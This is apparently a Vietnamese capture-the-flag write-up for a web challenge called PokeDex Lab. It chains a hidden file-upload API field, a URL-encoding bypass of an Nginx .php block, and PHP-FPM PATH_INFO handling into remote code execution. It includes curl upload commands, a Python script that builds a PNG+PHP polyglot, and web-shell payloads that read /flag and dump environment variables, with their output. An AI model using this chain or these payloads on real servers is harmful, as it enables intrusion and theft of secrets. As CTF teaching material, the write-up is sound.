+- SPA (Single Page Application) — PokeDex Lab, kiểu Pokemon catalog
+- Backend JSON REST API tại `/api/*`
+
+### Khám phá API
+
+Đọc source `app.js` tìm được routes:
+
+```javascript
+const apiRoutes = Object.freeze({
+    pokedex:     '/api/pokedex',
+    collections: '/api/collections',
+    schema:      '/api/schema',
+});
+```
+
+Gọi `GET /api/schema` trả về OpenAPI spec, trong đó endpoint `POST /api/collections/{id}/entries` mô tả chi tiết request body:
+
+```json
+{
+    "item": {
+        "properties": {
+            "product":  { "type": "string" },
+            "quantity": { "type": "integer" },
+            "option": {
+                "properties": {
+                    "id":    { "type": "string" },
+                    "value": { "type": "string" },
+                    "file": {
+                        "properties": {
+                            "data_base64":  { "type": "string" },
+                            "content_type": { "type": "string" },
+                            "filename":     { "type": "string" }
+                        }
+                    }
+                }
+            }
+        }
+    }
+}
+```
+
+Đồng thời trong `app.js`, code render cart cũng xác nhận frontend đã có logic xử lý file:
+
+```javascript
+const optionNote = line.option && line.option.file
+    ? 'Uploaded file'
+    : product.subtitle;
+```
+
+**Phát hiện quan trọng:** Schema lộ rõ trường `item.option.file` với `data_base64`, `content_type`, `filename` — đây là **primitive upload file ẩn** qua API mà giao diện không hiện nút upload. Người dùng tự tạo request là upload được.
+
+### robots.txt
+
+```
+User-agent: *
+Disallow: /api/
+Disallow: /media/uploads/
+```
+
+Xác nhận thư mục upload: `/media/uploads/`.
+
+### Mapping hành vi Nginx
+
+| Request | Code | Ý nghĩa |
+|---------|------|----------|
+| `GET /` | 200 | SPA `index.html` |
+| `GET /nonexistent` | 200 | SPA fallback (`try_files`) |
+| `GET /nonexistent.php` | **200** | SPA fallback — **`.php` KHÔNG bị block ở root** |
+| `GET /media/uploads/avatar.png` | 200 | Serve file trực tiếp |
+| `GET /media/uploads/exploit.php` | **406** | **Block! Chỉ ở `/media/uploads/`** |
+
+&rarr; Rule chặn `.php` (406) chỉ áp dụng dưới `/media/uploads/`, không toàn server.
+
+Extension nào được serve từ `/media/uploads/`:
+
+| Extension | Code |
+|-----------|------|
+| `.png` | 200 |
+| `.jpg` | 200 |
+| `.gif` | 200 |
+| `.webp` | 404 |
+| `.svg` | 404 |
+| `.phtml` | 404 |
+
+&rarr; Nginx chỉ serve `png`, `jpg`, `gif` từ thư mục uploads.
+
+## Phân tích lỗ hổng
+
+### Lỗ hổng 1 — Unrestricted file upload
+
+Upload PNG+PHP polyglot (file PNG 1×1 hợp lệ nối thêm PHP code) với filename `.php`:
+
+```bash
+# Tạo collection
+curl -s -X POST http://67.223.119.69:30000/api/collections \
+  -H 'Content-Type: application/json' -d '{}'
+# → "69bc4bfd0694f9dbca25805f"
+
+# Upload
+curl -s -X POST ".../api/collections/69bc4bfd0694f9dbca25805f/entries" \
+  -H 'Content-Type: application/json' \
+  -d '{"item":{"product":"psyduck-pond","quantity":1,
+       "option":{"file":{"data_base64":"<polyglot_base64>",
+       "content_type":"image/png","filename":"exploit.php"}}}}'
+```
+
+Response:
+
+```json
+{
+    "file": {
+        "filename": "exploit.php",
+        "path": "/media/uploads/exploit.php",
+        "size": 133, "width": 1, "height": 1
+    }
+}
+```
+
+Backend **không filter filename extension** — chấp nhận `.php` và lưu nguyên tên.
+
+### Lỗ hổng 2 — `$request_uri` bypass bằng URL encoding
+
+Truy cập trực tiếp → bị chặn:
+
+```
+GET /media/uploads/exploit.php → 406 Not Acceptable
+```
+
+URL-encode **một ký tự** trong `.php`:
+
+```
+GET /media/uploads/exploit.ph%70 → 404 Not Found (KHÔNG PHẢI 406!)
+```
+
+| Raw URI | Response | Giải thích |
+|---------|----------|-----------|
+| `exploit.php` | 406 | Chứa `.php` → bị block |
+| `exploit.ph%70` | 404 | `%70` ≠ `php` trên raw URI → **bypass** |
+| `exploit.PHP` | 406 | Case-insensitive → block |
+
+Rule block dùng `$request_uri` (raw URI **chưa** decode), nhưng Nginx decode `%70` → `p` **trước** location matching.
+
+### Lỗ hổng 3 — PHP-FPM PATH_INFO
+
+Kết hợp URL encoding bypass + PATH_INFO trick:
+
+```
+GET /media/uploads/exploit.ph%70/.png
+```
+
+Luồng xử lý trong Nginx:
+
+```
+[1] Raw URI:  /media/uploads/exploit.ph%70/.png
+[2] Check $request_uri ~* "\.php":
+    → "ph%70" ≠ "php" → BYPASS 406 ✓
+[3] URL decode → /media/uploads/exploit.php/.png
+[4] Location match "~ \.php(/|$)":
+    → URI chứa ".php/" → MATCH PHP-FPM handler ✓
+[5] fastcgi_split_path_info ^(.+\.php)(/.*)$:
+    → SCRIPT_FILENAME = /media/uploads/exploit.php
+    → PATH_INFO       = /.png
+[6] PHP-FPM thực thi exploit.php → RCE ✓
+```
+
+## Exploit
+
+### Tạo PNG+PHP polyglot
+
+```python
+import base64, struct, zlib
+
+sig = b'\x89PNG\r\n\x1a\n'
+ihdr_d = struct.pack('>IIBBBBB', 1, 1, 8, 2, 0, 0, 0)
+ihdr_c = zlib.crc32(b'IHDR' + ihdr_d) & 0xffffffff
+ihdr = struct.pack('>I', 13) + b'IHDR' + ihdr_d + struct.pack('>I', ihdr_c)
+raw = b'\x00\xff\x00\x00'
+comp = zlib.compress(raw)
+idat_c = zlib.crc32(b'IDAT' + comp) & 0xffffffff
+idat = struct.pack('>I', len(comp)) + b'IDAT' + comp + struct.pack('>I', idat_c)
+iend_c = zlib.crc32(b'IEND') & 0xffffffff
+iend = struct.pack('>I', 0) + b'IEND' + struct.pack('>I', iend_c)
+png = sig + ihdr + idat + iend
+
+php = b'<?php system("env"); ?>'
+payload = png + php
+print(base64.b64encode(payload).decode())
+```
+
+### Attempt 1 — `cat /flag*`
+
+Payload: `<?php system("cat /flag* 2>/dev/null; ls /; id"); ?>`
+
+```
+$ curl -s "http://67.223.119.69:30000/media/uploads/catflag.ph%70/.png" | strings
+
+KMACTF{pokedex_qYaxLfioGLxqIBgz773230c2}     ← flag từ file /flag
+bin
+dev
+etc
+flag
+home
+...
+uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
+```
+
+### Attempt 2 — `env`
+
+Payload: `<?php system("env"); ?>`
+
+```
+$ curl -s "http://67.223.119.69:30000/media/uploads/envdump.ph%70/.png" | strings
+
+USER=www-data
+HOSTNAME=c4616d6e77b3
+PHP_VERSION=8.3.33
+PWD=/var/www/html/media/uploads
+...
+FLAG=KMACTF{pokedex_qYaxLfioGLxqIBgz773230c2}  ← flag từ env var
+```
+
+Cả hai cách đều cho ra cùng flag — file `/flag` và env `$FLAG` được set cùng giá trị khi container start.
+
+**Lưu ý:** Flag dynamic, rotate mỗi lần container restart. Exploit xong cần submit ngay trước khi instance bị tắt.
+
+> KMACTF{pokedex_qYaxLfioGLxqIBgz773230c2}
